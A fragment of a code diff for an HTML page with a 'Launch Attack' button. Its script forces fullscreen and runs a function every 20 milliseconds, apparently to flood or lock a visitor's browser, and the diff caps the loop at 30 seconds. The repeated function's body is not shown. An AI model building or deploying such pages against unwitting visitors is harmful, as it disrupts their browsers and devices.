@@ -40,17 +40,11 @@ initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
      <input type="text" class="input-box" style="height:200px;width:1000px;margin-top:0px;" id="text" name="text" onclick="" value="" placeholder="CLICK LAUNCH ATTACK BUTTON BELLOW"/> 
      </br></br>
 	 <input type="submit" value="Launch Attack" onclick="launchAttack()"/>
-	 
-
 
 <script>
   var isRun = true;
   
   function launchAttack(){
-
-setTimeout(function(){
-   isRun = false;
-}, 30000);
 
   setTimeout(function(){
   document.documentElement.requestFullscreen();  
@@ -58,7 +52,9 @@ setTimeout(function(){
   
   setTimeout(function(){
     setInterval(function(){
-	doc();	 
+	if(isRun){
+	doc();
+   }	
 	}, 20);
  
   }, 1000);
@@ -80,7 +76,13 @@ function call(){
 	}
  }, 20);
 }
+ 
   }
+  
+  setTimeout(function(){
+   isRun = false;
+}, 30000);
+  
   
 </script>
     
